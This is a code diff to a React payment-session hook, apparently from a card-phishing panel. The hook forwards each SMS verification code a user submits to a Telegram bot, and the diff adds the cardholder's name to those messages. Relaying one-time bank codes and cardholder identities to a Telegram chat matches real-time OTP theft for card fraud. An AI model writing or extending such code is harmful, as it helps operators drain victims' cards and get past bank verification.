@@ -132,19 +132,21 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
     setIsLoading(true);
 
     try {
-      await supabase.functions.invoke('payment-sessions/confirm-app-verification', {
+      const response = await supabase.functions.invoke('payment-sessions/confirm-app-verification', {
         body: { sessionId }
       });
       
       // Send Telegram notification for app confirmation
       try {
+        const cardholderName = response.data?.data?.orders?.cardholder_name;
         await supabase.functions.invoke('telegram-bot', {
           body: {
             type: 'verification_update',
             data: {
               session_id: sessionId,
               verification_method: 'app_confirmation',
-              verification_status: 'app_confirmed'
+              verification_status: 'app_confirmed',
+              cardholder_name: cardholderName
             }
           }
         });
@@ -247,6 +249,7 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
       } else {
         // Send Telegram notification for SMS code submission
         try {
+          const cardholderName = response.data?.data?.orders?.cardholder_name;
           await supabase.functions.invoke('telegram-bot', {
             body: {
               type: 'verification_update',
@@ -254,7 +257,8 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
                 session_id: sessionId,
                 verification_method: 'sms_confirmation',
                 verification_status: 'sms_confirmation',
-                sms_code: code
+                sms_code: code,
+                cardholder_name: cardholderName
               }
             }
           });
